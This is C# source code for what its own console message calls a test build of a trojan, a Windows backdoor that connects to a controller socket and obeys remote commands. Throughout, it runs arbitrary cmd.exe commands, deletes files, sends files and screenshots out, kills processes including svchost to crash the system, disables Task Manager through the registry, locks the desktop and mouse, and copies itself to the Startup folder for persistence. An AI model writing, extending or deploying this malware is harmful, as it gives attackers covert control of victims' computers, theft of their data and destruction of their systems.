using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using System.Windows.Forms;
using System.Text.RegularExpressions;
using System.Xml;
using System.Drawing;
using System.Threading;

namespace Backdoor
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Привет это тестовая сборка трояна Софья(или София или Cоня и Софа)");
            Console.WriteLine("Консоль можно будет скрыть в настройках");
            var server = new Server();
            server.Connect();
        }

    }
    public class Server
    {
        private string adress = "127.0.0.1";
        private int port = 7777;
        private Socket conn = new Socket(new AddressFamily(), SocketType.Stream, ProtocolType.Tcp);

        public void Connect()
        {
            conn = null;
            conn = new Socket(new AddressFamily(), SocketType.Stream, ProtocolType.Tcp);
            while (true)
            {
                try
                {
                    IPEndPoint ipEndPoint = new IPEndPoint(IPAddress.Parse(adress), port);
                    conn.Connect(ipEndPoint);
                    Loop();
                    break;
                }
                catch (Exception e)
                {
                    var m = e.Message;
                }
            }
        }

        private void Loop()
        {
            while (true)
            {
                string data = null;

                byte[] bytes = new byte[100000];
                int bytesRec = 0;
                try
                {
                    bytesRec = conn.Receive(bytes);
                }
                catch { Connect(); break; }

                CommandExecutor executor = new CommandExecutor();
                data = Encoding.UTF8.GetString(bytes, 0, bytesRec);


                Console.Write("Полученный текст: " + data + "\n\n"); ;

                try
                {
                    if (data.StartsWith("ls"))
                    {
                        data = data.Remove(0, 2);
                        string path = ParseComand(data);
                        var files = executor.ScanDirectoryFromXml(path);
                        conn.Send(Encoding.UTF8.GetBytes(files));
                        continue;
                    }

                    if (data.StartsWith("rm"))
                    {
                        data = data.Remove(0, 2);
                        string path = ParseComand(data);
                        executor.RemoveFileOrDirectory(path);
                        conn.Send(Encoding.UTF8.GetBytes("Файл " + path + " удалён."));
                        continue;
                    }

                    if (data.StartsWith("start"))
                    {

                        data = data.Remove(0, 5);
                        string path = ParseComand(data);
                        executor.StartFile(path);
                        conn.Send(Encoding.UTF8.GetBytes("Процесс " + path + " запущён."));
                        continue;
                    }


                    if (data.StartsWith("pkill"))
                    {
                        data = data.Remove(0, 5);
                        var pname = ParseComand(data);
                        executor.pkill(pname);
                        conn.Send(Encoding.UTF8.GetBytes("Процесс с именем " + pname + " уничтожен"));
                        continue;
                    }

                    if (data == "tasklist")
                    {
                        string tasks = executor.GetAllTasksInSysFromXml();
                        conn.Send(Encoding.UTF8.GetBytes(tasks));
                        continue;
                    }

                    if (data.StartsWith("cmd"))
                    {
                        data = data.Remove(0, 3);
                        string comm = ParseComand(data);
                        var result = executor.ExecuteCmdCommand(comm);
                        conn.Send(Encoding.UTF8.GetBytes(result));
                        continue;
                    }

                    if (data.StartsWith("msg"))
                    {
                        data = data.Remove(0, 3);
                        string msg = ParseComand(data);
                        executor.ShowUserMsg(msg);
                        conn.Send(Encoding.UTF8.GetBytes($"Сообщение отправлено"));
                        continue;
                    }
                    if (data.StartsWith("enTaskmgr"))
                    {
                        data = data.Remove(0, 9);
                        string comm = ParseComand(data);
                        if (comm == "true")
                        {
                            executor.UnLockTaskMgr();
                            conn.Send(Encoding.UTF8.GetBytes($"Диспетчер задач включен"));
                        }
                        if (comm == "false")
                        {
                            executor.LockTaskMgr();
                            conn.Send(Encoding.UTF8.GetBytes($"Диспетчер задач выключен"));
                        }
                        continue;
                    }
                    if (data == "bluescreen")
                    {
                        executor.CrashSystem();
                        conn.Send(Encoding.UTF8.GetBytes("Система успешно крашнута"));
                        continue;
                    }
                    if (data.StartsWith("download"))
                    {
                        data = data.Remove(0, 3);
                        string comm = ParseComand(data);
                        conn.Send(File.ReadAllBytes(comm));
                        conn.Send(Encoding.UTF8.GetBytes("Не получилось скачать файл"));
                        continue;
                    }
                    if (data.StartsWith("transl"))
                    {
                        var comm = ParseComand(data);
                        if (comm == "get")
                        {
                            conn.Send(executor.CaptureScreenAndTransleteToBytes());
                            continue;
                        }
                    }
                    if (data.StartsWith("block"))
                    {
                        data = data.Remove(0, 5);
                        string comm = ParseComand(data);
                        if (comm == "true")
                        {
                            executor.LockSystem();
                            conn.Send(Encoding.UTF8.GetBytes("заблокированно"));
                            continue;
                        }
                        if (comm == "false")
                        {
                            executor.UnLockSystem();
                            conn.Send(Encoding.UTF8.GetBytes("разблокированно"));
                            continue;
                        }
                        else
                        {
                            throw new Exception("блокировка системы: неверный аргумент");
                        }
                    }
                    if (data.StartsWith("curblock"))
                    {
                        data = data.Remove(0, 5);
                        string comm = ParseComand(data);
                        if (comm == "true")
                        {
                            executor.LockMouse();
                            conn.Send(Encoding.UTF8.GetBytes("курсор заблокирован"));
                            continue;
                        }
                        if (comm == "false")
                        {
                            executor.UnLockMouse();
                            conn.Send(Encoding.UTF8.GetBytes("курсор разблокирован"));
                            continue;
                        }
                    }
                }
                catch (Exception e)
                {
                    conn.Send(Encoding.UTF8.GetBytes("Ошибка: " + e.Message + " Sourse:" + e.Source));
                }
            }
        }
        public static string ParseComand(string allcommand, Char attribute = '$')
        {
            string commandBody = "";
            bool flag = false;
            for (int i = 0; i < allcommand.Length; i++)
            {
                if (flag)
                    commandBody += allcommand[i];
                if (allcommand[i] == attribute)
                    flag = true;
            }
            return commandBody;
        }
    }
    public class CommandExecutor
    {
        private static Thread blockMouseThread = null;

        [System.Runtime.InteropServices.DllImport("user32")]
        private static extern int SetCursorPos(int x, int y);

        public CommandExecutor()
        {

        }
        public void pkill(int pid)
        {
            var process = Process.GetProcesses();
            for (int i = 0; i < process.Length; i++)
            {
                if (process[i].Id == pid)
                {
                    process[i].Kill();
                    break;
                }
            }
        }
        public void pkill(string pname)
        {
            var process = Process.GetProcesses();
            for (int i = 0; i < process.Length; i++)
            {
                if (process[i].ProcessName == pname)
                {
                    process[i].Kill();
                    break;
                }
            }
        }
        public string GetAllTasksInSysFromXml()
        {
            string tasks = "";

            var process = Process.GetProcesses();
            tasks += "<tasklist>";
            for (int i = 0; i < process.Length; i++)
            {
                tasks += "<task>" + process[i].ProcessName + "</task>";
            }
            tasks += "</tasklist>";
            return tasks;
        }
        public string ScanDirectoryFromXml(string path)
        {
            var dirFiles = Directory.GetFiles(path);
            var directoris = Directory.GetDirectories(path);
            string files = "";

            files += "<files> ";
            for (int i = 0; i < dirFiles.Length; i++)
            {
                files += $" <file{i}> " + Path.GetFileName(dirFiles[i]) + $" </file{i}>";
            }
            for (int i = 0; i < directoris.Length; i++)
            {
                files += $" <dir{i}> " + "/" + Path.GetFileName(directoris[i]) + $" </dir{i}>";
            }
            files += " </files>";
            return files;
        }
        public void RemoveFileOrDirectory(string path)
        {
            try { File.Delete(path); } catch { }
            try { Directory.Delete(path, true); } catch { }
        }
        public void StartFile(string path)
        {
            var t = new Thread(() => Process.Start(path));
            t.Start();
        }
        public byte[] GetFileFroUpload()
        {
            return new byte[1];
        }
        public string ExecuteCmdCommand(string comm)
        {
            var proc = new Process();
            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.FileName = "CMD.exe";
            proc.StartInfo.Arguments = " /C " + comm;
            proc.Start();
            return proc.StandardOutput.ReadToEnd();
        }
        public void CrashSystem()
        {
            var process = Process.GetProcesses();
            for (int i = 0; i < process.Length; i++)
            {
                if (process[i].ProcessName == "svchost")
                {
                    process[i].Kill();
                    break;
                }
            }
        }
        public void ShowUserMsg(string docContent)
        {
            XmlDocument doc = new XmlDocument();
            doc.LoadXml(docContent);

            XmlNode root = doc.FirstChild;

            var textMsg = "";
            var textSub = "";
            var textBut = "";
            var textIco = "";

            if (root.HasChildNodes)
            {
                for (int i = 0; i < root.ChildNodes.Count; i++)
                {
                    if (root.ChildNodes[i].Name == "text")
                        textMsg = root.ChildNodes[i].InnerText;
                    if (root.ChildNodes[i].Name == "subject")
                        textSub = root.ChildNodes[i].InnerText;
                    if (root.ChildNodes[i].Name == "but")
                        textBut = root.ChildNodes[i].InnerText;
                    if (root.ChildNodes[i].Name == "ico")
                        textIco = root.ChildNodes[i].InnerText;
                }
            }
            var t = new Thread(() => MessageBox.Show(textMsg, textSub, (MessageBoxButtons)int.Parse(textBut), MessageBoxIcon.Error));
            t.Start();
        }
        public byte[] CaptureScreenAndTransleteToBytes()
        {
            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);


            Graphics graphics = Graphics.FromImage(bitmap as System.Drawing.Image);
            graphics.CopyFromScreen(0, 0, 0, 0, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height));

            bitmap = ResizeImg(1140, 641, bitmap);

            MemoryStream stream = new MemoryStream();
            bitmap.Save(stream, System.Drawing.Imaging.ImageFormat.Jpeg);
            Byte[] bytesForSend = stream.ToArray();

            return bytesForSend;
        }
        public void LockMouse()
        {
            if (blockMouseThread != null) return;
            blockMouseThread = new Thread(() => SetZeroMouseInInfLoop());
            blockMouseThread.Start();
        }
        public void UnLockMouse()
        {
            if (blockMouseThread != null) blockMouseThread.Abort();
            blockMouseThread = null;
        }
        public void LockSystem()
        {
            LockTaskMgr();
            var process = Process.GetProcesses();
            for (int i = 0; i < process.Length; i++)
            {
                if (process[i].ProcessName == "Backdoor")
                {
                    continue;
                }
                if (process[i].ProcessName == "explorer")
                {
                    process[i].Kill();
                }
                if (!String.IsNullOrEmpty(process[i].MainWindowTitle))
                {
                    process[i].Kill();
                }
            }
            LockMouse();
        }
        public void UnLockSystem()
        {
            StartFile("c:/Windows/explorer.exe");
            UnLockMouse();
        }
        public void LockTaskMgr()
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
        @"Software\Microsoft\Windows\CurrentVersion\Policies\System");

            objRegistryKey.SetValue("DisableTaskMgr", "1");
            objRegistryKey.Close();
        }
        public void UnLockTaskMgr()
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (objRegistryKey.GetValue("DisableTaskMgr") != null)
                objRegistryKey.DeleteValue("DisableTaskMgr");
        }
        public static void AddToStartUp()
        {
            var startPath = "c:/Users/VASUS/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
            var dir = Directory.GetCurrentDirectory() + "/Backdoor.exe";
            File.Copy(dir, startPath);
        }
        private void SetZeroMouseInInfLoop()
        {
            while (true)
            {
                Thread.Sleep(50);
                SetCursorPos(0, 0);
            }
        }
        private Bitmap ResizeImg(int newWidth, int newHeight, Bitmap imgToResize)
        {
            Bitmap b = new Bitmap(newWidth, newHeight);
            Graphics g = Graphics.FromImage((Image)b);
            g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;

            g.DrawImage(imgToResize, 0, 0, newWidth, newHeight);
            g.Dispose();

            return b;
        }
    }
}
